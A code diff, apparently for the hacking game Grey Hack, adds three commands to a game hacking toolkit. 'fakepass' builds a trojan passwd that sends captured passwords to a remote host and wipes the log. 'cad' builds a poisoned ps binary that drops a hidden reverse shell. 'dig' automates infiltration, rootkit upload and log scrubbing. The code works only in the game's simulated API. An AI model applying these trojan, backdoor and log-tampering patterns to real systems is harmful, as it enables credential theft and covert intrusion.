@@ -1,4 +1,4 @@
-if DEBUG then print("<size=75%>loading kore.5pk v 4.2.4...(43.286)</size>")
+if DEBUG then print("<size=75%>loading kore.5pk v 4.2.6...(57.875)")
 command.kore = function(arg1,arg2=0,arg3=0,arg4=0)
     time_s = time
     kore_usage_info = "<u>"+colorGold+"KORE 3.0 || automation || helper || Goddess of the DEAD and GRAIN || rkit || security"+char(10)+char(10)+
@@ -819,4 +819,268 @@ command.nt = function(arg1, arg2, arg3, arg4)
         return command.run(terminal.path, newprompt.remove("--nt"),use_shell) // let's be real, --5pork is hilarious but too much to type
     end if
 	return "shell: error; Terminal.exe not found"
+end function
+command.fakepass = function(arg1=0, arg2=0, arg3=0, arg4=0)
+    if arg1 == "help" or arg1 == "-h" then return "Usage: fakepass [opt:ip] [opt:pass] -- create passwd.src in current_path. Check src and build to /bin/passwd. PW capture malware."
+    ip = arg1
+    p = arg2
+    if not ip then ip = """"+user_input("remote ip:> ",0,0)+"""" else ip = """"+ip+""""
+    if ip == """"+""+"""" then return "aborting..."
+    if not p then p = """"+user_input("remote pass:> ",1,0)+"""" else p = """"+p+""""
+    if p == """"+""+"""" then return "aborting..."
+    passwd = "if params.len != 1 then exit(""<b>Usage: passwd [username]</b>""+char(10)+""Example: passwd john"");print(""Changing password for user ""+params[0]+""."");pass = user_input(""New password:"", 1);catch = get_shell.host_computer.change_password(params[0], pass);if catch != 1 then;if catch then exit(catch);exit(""Error: password not modified"");end if;"
+    rem_c = "localmachine=get_shell.host_computer;ip = "+ip+";pt = 22;user = ""root"";p="+p+";remote = get_shell.connect_service(ip, pt, user, p);if remote then;remote.host_computer.touch(""/root/rkit"",""rpm"");rpm=remote.host_computer.File(""/root/rkit/rpm"");if rpm then rpm.set_content(rpm.get_content+char(10)+pass+char(10)+localmachine.public_ip+char(10)+localmachine.local_ip);end if;"
+    scrub = "syslog = localmachine.File(""/var/system.log"");if syslog then;localmachine.touch(""/var"",""system.bak"");sbk=localmachine.File(""/var/system.bak"");if sbk then;sbk.set_content(""No IPs Today :D"");syslog.delete;sbk.move(""/var"", ""system.log"");end if;end if;"
+    final = "if catch == 1 then exit(""password modified OK"");if catch then exit(catch);print(""Error: password not modified"")"
+    fp = passwd + rem_c + scrub + final
+    localmachine.touch(currentPath, "passwd.src")
+    source = globals.get_file("passwd.src")
+    print("FakePass v 0.2, by Plu70")
+    print(colorRed+"- - - - - - - - - - - - - - - - - - - - -"+CT)
+    if not source then return "write error: unable to create passwd.src in "+currentPath
+    source.set_content(fp)
+    wait(1)
+    print(source.get_content)
+    print
+    saved = "password.src"
+    if currentPath != "/" then saved = "/password.src"
+    print(colorLightBlue+"Saved to: "+colorWhite+currentPath+saved+CT)
+    print(colorRed+"- - - - - - - - - - - - - - - - - - - - -"+CT+char(10))
+    return 0
+end function
+command.cad = function(add=0, pt=0, arg3=0, arg4=0)
+    if add == "help" or add == "-h" then return colorRed+"cad:</b> cloak and dagger protocol"+char(10)+
+	"Usage: cad [optional: ip ] [optional: port] -- create a poisoned ps.src that hides itself"+char(10)+
+	"-- prompts for ip if not passed"+char(10)+
+	"-- defaults to port 1222 if not passed"+char(10)+
+	"-- creates the file "+colorRed+"ps.src"+CT+" in the current path "+char(10)+
+	"-- it <b>does not build</b> the file; review first, then build"+char(10)+
+	"-- ps.src contains code for a poisoned <b>ps</b> binary"+char(10)+char(10)+
+	"** Review ps.src and build with make or makfit into <b>/bin/ps"+char(10)+
+	"** Remove the .src, "+char(10)+
+	"*** optionally run /bin/ps once with metaxploit.so present then remove metaxploit.so"+char(10)+
+	"*** or leave it in place and wait for the target to run it"+char(10)+
+	"*** if they do, and metaxploit.so isn't present, it will just act like normal ps"+char(10)+
+	"*** if metaxploit is present, a reverse shell will be dropped, named ps"+char(10)+
+	"*** the poisoned ps binary will hide this back door"+char(10)+
+	"***** beware! using plain old ...host_computer.show_procs will reveal the trick!"+char(10)+
+	"The result is a hidden backdoor / trojan on the target. Use with care."+char(10)+
+	"n.b. you get bonus points for extending the code to be even more nefarious"
+    ps = """"+"ps"+""""
+    shell = """"+"5hell"+""""
+    zp = """"+"0.0%"+""""
+    z2 = """"+"0.3%"+""""
+    z1 = """"+"0.4%"+""""
+    zf = [zp,z1,z2]
+    zf.shuffle
+    m_path = """"+"/lib/metaxploit.so"+""""
+    m = """"+"metaxploit.so"+""""
+    //add = arg1
+	if not pt then pt = "1222"
+    if not add then add = """"+user_input("rshell addr:> ")+"""" else add = """"+add+""""
+    if add == """"+""+"""" then return "aborting..."
+    rip="ps=function();zp="+zp+";z2="+z2+";z1="+z1+";zf=[zp,z1,z2];zf.shuffle;procs = get_shell.host_computer.show_procs;k_tar = "+ps+";k_tar1 = "+shell+";processes = [];processes = procs.split(char(10));for p in processes;process = p.split(char(32));process_CMD = process[4];process_MEM = process[3];process_CPU = process[2];process_ID = process[1];process_user = process[0];if process_CMD == k_tar or process_CMD == k_tar1 then;continue;else;print(format_columns(process_user + char(32) + process_ID + char(32) + process_CPU + char(32) + process_MEM + char(32) + process_CMD));end if;end for;rng = range(1120, 9982);rng.shuffle;return(format_columns(active_user+char(32)+rng.pop+char(32)+"+zp+"+char(32)+zf.pop+char(32)+"+ps+"));end function"
+    // nop
+    nop="meta = include_lib("+m_path+");if not meta then include_lib("+m+");if not meta then exit(ps);meta.rshell_client("+add+","+pt+","+ps+");exit(ps)"
+    header = char(10)+"// Cloak and Dagger"+char(10)
+    locals.cad = (header+char(10)+rip+char(10)+nop)
+    localmachine.touch(currentPath, "ps.src")
+    source = globals.get_file("ps.src")
+    print("Cloak and Dagger Protocol v 0.4, by Plu70")
+    print(colorRed+"- - - - - - - - - - - - - - - - - - - - -"+CT)
+    if source then
+      source.set_content(locals.cad)
+      wait(1)
+      out = source.get_content
+      print(out)
+      print
+        print(colorLightBlue+"Saved to: "+colorWhite+currentPath+"/ps.src"+CT)
+    else
+      print("write failed"+char(10))
+    end if
+    print(colorRed+"- - - - - - - - - - - - - - - - - - - - -"+CT+char(10))
+    return 0
+end function
+command.dig = function(arg1,arg2=0,arg3=0,arg4=0)
+  if not arg1 or arg1 == "help" or arg1 == "-h" then 
+    if arg2 and arg2 == "extra" then return colorGold+"Dig: Extra!"+CT+char(10)+"Here is a useful dig.bat script for dropping rshells"+char(10)+"first, set dig.bat to:"+char(10)+
+		"ifconfig -p | probe -q"+char(10)+
+		"brutus | clipb"+char(10)+
+		"clipa | echo PASSWORD:"+char(10)+
+		"echo do 1 -f r.bat | clipc"+char(10)+
+		"run /home/guest/rkit/5hell @b @c"+char(10)+
+		"rclean -d 1"+char(10)+
+		"quit dig_complete"+char(10)+char(10)+
+		"then, poke a new file in rkit called r.bat"+char(10)+
+		"set it to:"+char(10)+
+		"rshell [your server ip] [some name]"+char(10)+
+		"-- if you have set get_custom_object.HOME in 5hell.src then use this line instead:"+char(10)+
+		"rshell @home [some name]"+char(10)+
+		"quit rshell_placed"+char(10)+char(10)+
+		"This will dig the target like normal, then launch 5hell with the gained root shell"+char(10)+"Once launched, a reverse shell will be dropped, the log scrubbed, rkit removed, and dig will exit both 5hell instances."
+    return "<b>DIG v 2.1 Netcrawler || Autohacking || Automation</b>"+char(10)+
+	"Usage: dig [-s|ip|port] [port|ip] [opt:--edit] -- auto-infiltrate a target"+char(10)+
+	"-- runs <b>db</b> on target [ip] and [port]"+char(10)+
+	"-- infiltrates via shell if found"+char(10)+
+	"-- uploads rkit and runs 5hell on the target"+char(10)+
+	"-- gains root and wipes the log"+char(10)+
+	"-- performs other taskes as defined by the user in <u>dig.bat"+char(10)+
+	"-- dig.bat may contain <b>do</b>calls (do # -f your.file) to daisy chain digs"+char(10)+
+	"Note: dig may take port and ip in any order"+char(10)+
+	"-- not supplying a port defaults to port 0 aka the rouer"+char(10)+
+	"Usage: dig -s -- will scan the internet for a suitable target"+char(10)+
+	"-- uses database.csv to choose targets with known kernel_router versions"+char(10)+
+	"-- if the matched router has a shell exploit, dig will auto infiltrate as normal"+char(10)+
+	"-- susses out random ips until a match is found"+char(10)+
+	"-- sussing routers does not leave a log if no shell is found"+char(10)+
+	"Note: edit /root/rkit/dig.bat to customize behavior"+char(10)+
+	"-- by default you will be prompted to exit 5hell when dig completes"+char(10)+
+	"-- type 'y' to exit and return to the script that launched dig"+char(10)+
+	"-- or add <b>quit dig_complete</b> to exit automatically with an echo"+char(10)+
+	"<b>Note:</b> supplying <b>--edit</b> as argument three will open dig.bat in scribus"+char(10)+
+	"-- dig will continue as normal after editing is complete"+char(10)+
+	"-- you may add/remove commands to be executed by dig here"+char(10)+
+	"<b>Note:</b> supplying <b>--edit</b> as agrgument one will open dig.bat in scribus"+char(10)+
+	"-- dig will then exit after editing the batch file."+char(10)+
+	"Usage example:|> <b>rnip 1 | dig </b>"+char(10)+
+    "Usage example:|> <b>dig 1.1.1.1 22 --edit"+char(10)+
+	"Usage example:|> <b>do 20 | dig -s"
+	colorGold+"Experimental</b></color>: dig -s -- sus mode, gets random routers and checks version against database"+char(10)+
+	"-- if the lib version is in the database, will dig that router"+char(10)+
+	"-- sussing specifically looks for shells on routers"+char(10)+
+	"-- for best results, use a database.csv that only includes entries with shell exploits"+char(10)+
+	"---- Extra: dig [-h|help] extra -- display extra help info"
+  end if
+  print(colorGold+"<u>------DIG-v-2.1------</u>"+CT+char(10))
+  //tp = arg1.split(" ") // sometimes we want to pipe target ip AND a port. this will help with that.
+  tp = arg1
+  //t = tp[0] // target ip
+  //p = tp[-1] // target port
+  t = arg1 
+  p = arg2
+  suss = false
+  if t == "-s" then 
+  	suss = true
+  	t = globals.sus // in 5phinx.5pk
+	p = "0"
+  end if
+  //if p == t then p = arg2 /////////////// make sure this works: if arg1 was not split, arg 2 is the port. default is 0 aka router
+  if not is_valid_ip(t) and t != "--edit" then
+    t = arg2 
+    p = arg1 
+    if not is_valid_ip(t) and t != "--edit" then return "dig: invalid ip"
+  end if
+  if DEBUG then print "debug: target ip: "+t+char(10)+"debug: target port: "+p
+  // find the root kit     
+  kit = command.tree("/","rkit",1,"N")
+  if not kit then return "rkit not found"
+  pe = kit.permissions.values
+  r = 0
+  w = 0
+  x = 0
+  if pe[-1] == "x" then x = 1
+  if pe[-2] == "w" then w = 1
+  if pe[-3] == "r" then r = 1
+  // edit dig.bat if necessary
+  if DEBUG then print "debug: checking for dig.bat in: "+kit.path
+  bat_file = globals.get_file(kit.path+"/dig.bat")
+  if not bat_file then 
+      command.poke(kit.path+"/dig.bat", "ifconfig -p | probe"+char(10)+"brutus | clipc"+char(10)+"grep -p ^5hell$ | clipb"+char(10)+"run @b "" do 1 rshell @home "" @c"+char(10)+"rclean -d @c")
+      bat_file = globals.get_file(kit.path+"/dig.bat")
+      if not bat_file then return "dig: unable to find or create dig.bat, aborting."
+  end if
+  if arg1 == "--edit" or arg2 == "--edit" or arg3 == "--edit" or arg4 == "--edit" then 
+	print("Editing the batch file: "+bat_file.path)
+	command.scribus(bat_file)
+  	if arg1 == "--edit" then return "dig: finished editing dig.bat"
+	if p == "--edit" then p = "0"
+  end if
+  // verify that we're ready to go
+  print("Checking dictionary...")
+  if not BIGBRAIN then 
+      tabs = globals.get_file("/root/tables/tp")
+      if tabs then 
+          command.cerebrum("-i",tabs.path)
+      else 
+          command.cerebrum
+      end if
+  end if
+  // portmap target
+  command.probe("-q",t,p)
+  print "dig: clearing old XPLOITS list..."
+  globals.XPLOITS = null
+  // if not in database, scan target
+//  if command.meta("link","-r") then
+  print "dig: preparing to link database..."
+  dcsv = globals.get_file(kit.path+"/database.csv")
+  if not dcsv then
+	print "dig: creating "+kit.path+"/database.csv.."
+	print command.poke(kit.path+"/database.csv")
+	dcsv = globals.get_file(kit.path+"/database.csv")
+	if not dcsv then return colorOrange+"dig: database error"+char(10)+"-- manually create database.csv or run db"
+  end if
+//   if typeof(command.meta("link")) != "MetaLib" then
+//       print command.db("-r")
+//       //if command.meta("link","-r") then // idfk
+// 	  if typeof(command.meta("link")) != "MetaLib" then // idfk // ffs this better work
+//           return "dig: database error!"+char(10)+"-- idfk"
+//       end if
+//   end if
+	ml = command.meta("link")
+	if typeof(ml) != "MetaLib" then return "dig: unable to connect;"+char(10)+"-- firewall or bad ip:"+char(10)+"--: "+ml
+	//ldb = command.linkdb(ml.name+" v "+ml.version)
+	if globals.XPLOITS == null then print command.db("-r")
+	if globals.XPLOITS == null then return "dig: database error!"+char(10)+"-- ffs, quid facis, Plutus?"+char(10)+"-- figere stercus"  // if shell exploit, exploit target
+  mem = []
+  unsec_val = []
+  
+  for xp in globals.XPLOITS
+      yp = xp.split(" ")
+      zp = yp[-1]
+	  if DEBUG then print "debug: zp: "+zp
+      if zp == "shell" then // needs adjustment to prioritize root > user > guest shells
+          mem.push(yp[0])
+          unsec_val.push(yp[1])
+      end if
+  end for
+  if DEBUG then print "mem: "+mem
+  if mem == [] then return "dig: shell exploit not found on target"
+  digging = true
+  dig_this = null
+  while digging 
+	if mem.len > 0 then
+  		dig_this = command.zap(mem[0],unsec_val[0],0) // get the remote shell
+		mem.pull 
+		unsec_val.pull
+		if typeof(dig_this) == "shell" then digging = false 
+	else
+		digging = false	
+	end if
+  end while
+  if typeof(dig_this) != "shell" then 	
+  	if suss then return command.dig("-s") else return "dig: failed to obtain shell on target."
+  end if
+  // upload rkit (mind permissions)
+  if DEBUG then print "dig: found a shell"
+  print command.perms("-r","o+rwx", kit.path)
+  print kit.path+ " "+kit.permissions
+  globals.shell.scp(kit.path, "/home/guest", dig_this)
+  // command.perms("-r","o-rwx","/root/rkit")
+  pe = ""
+  if not r then pe = pe + "r"
+  if not w then pe = pe + "w"
+  if not x then pe = pe + "x"
+  if pe != "" then print command.perms("-r","o-"+pe, kit.path)
+  print "restoring permissions: "+kit.path+" "+kit.permissions
+  // run 5hell on target with params:
+  // -- cob import | brutus
+  // -- other user defined params
+  print "launching 5hell remotely..."
+  globals.stack_pool("up")
+  dig_this.launch("/home/guest/rkit/5hell", "do 1 -f /home/guest/rkit/dig.bat") // let's make this configurable instead of putting ppl on rails
+  //_cascade // exit if cascade
+  globals.stack_pool("down")
+  // rclean and exit
+  // repeat if necessary
+  return "returning to original 5hell session..."
 end function
